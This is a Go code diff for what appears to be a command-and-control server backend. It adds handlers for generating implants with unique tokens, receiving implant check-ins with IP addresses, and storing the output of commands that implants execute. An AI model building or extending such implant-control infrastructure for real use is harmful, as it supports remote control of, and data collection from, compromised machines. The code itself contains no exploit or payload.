@@ -2,11 +2,11 @@ package controllers
 
 import (
 	"awesomeProject/config"
-	"awesomeProject/models"
-	"net/http"
-
 	"awesomeProject/database"
+	"awesomeProject/models"
 	"github.com/gin-gonic/gin"
+	"net/http"
+	"time"
 )
 
 // GetUserImplants returns all implants owned by the current user.
@@ -94,17 +94,114 @@ func GetCommandsForImplant(c *gin.Context) {
 		return
 	}
 
-	// Mark the commands as "executed" (optional, depending on your workflow)
-	for _, command := range commands {
-		err := database.MarkCommandAsExecuted(command.ID)
-		if err != nil {
-			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update command status"})
-			return
-		}
-	}
-
 	// Return the commands to the implant
 	c.JSON(http.StatusOK, gin.H{
 		"commands": commands,
+	})
+}
+
+// In controllers/implant_controllers.go
+func HandleCommandResult(c *gin.Context) {
+	// Extract the command ID and result from the request
+	var request struct {
+		CommandID int    `json:"command_id"`
+		Output    string `json:"output"`
+	}
+
+	if err := c.ShouldBindJSON(&request); err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request payload"})
+		return
+	}
+
+	status, err := database.GetCommandStatus(request.CommandID)
+
+	if err != nil {
+
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to fetch command status"})
+		return
+	}
+
+	if status == "executed" {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Command already executed"})
+		return
+	}
+
+	// Mark the command as executed and store the output
+	err = database.MarkCommandAsExecuted(request.CommandID, request.Output)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update command status"})
+		return
+	}
+
+	c.JSON(http.StatusOK, gin.H{
+		"message": "Command result received successfully",
+	})
+}
+
+func GenerateImplant(c *gin.Context) {
+	// Extract userID from context (set by AuthMiddleware)
+	userID, exists := c.Get("user_id")
+	if !exists {
+		c.JSON(http.StatusUnauthorized, gin.H{"error": "Unauthorized: Missing user ID"})
+		return
+	}
+
+	// Ensure userID is correctly casted to int
+	uid, ok := userID.(int)
+	if !ok {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "Invalid user ID format"})
+		return
+	}
+	// Call database function to create the implant for the user
+	implant, err := database.CreateImplant(uid)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to generate implant"})
+		return
+	}
+
+	// Return the generated implant details
+	c.JSON(http.StatusOK, gin.H{
+		"message":      "Implant generated successfully",
+		"unique_token": implant.UniqueToken,
+		"implant_id":   implant.ID,
+		"status":       implant.Status,
+	})
+}
+
+func CheckinImplant(c *gin.Context) {
+	var request struct {
+		UniqueToken string `json:"implant_id"`
+		IPAddress   string `json:"ip_address"`
+	}
+
+	// Bind JSON request body
+	if err := c.ShouldBindJSON(&request); err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request payload"})
+		return
+	}
+
+	// Find the implant by its unique_token
+	var implant models.Implant
+	result := config.DB.Where("unique_token = ?", request.UniqueToken).First(&implant)
+
+	if result.Error != nil {
+		c.JSON(http.StatusNotFound, gin.H{"error": "Implant not found"})
+		return
+	}
+
+	// Update implant status and mark as deployed
+	implant.Status = "online"
+	implant.Deployed = true
+	implant.IPAddress = request.IPAddress
+	implant.LastSeen = time.Now()
+
+	// Save changes to the database
+	config.DB.Save(&implant)
+
+	c.JSON(http.StatusOK, gin.H{
+		"message":   "Check-in successful",
+		"status":    implant.Status,
+		"deployed":  implant.Deployed,
+		"last_seen": implant.LastSeen,
 	})
 }
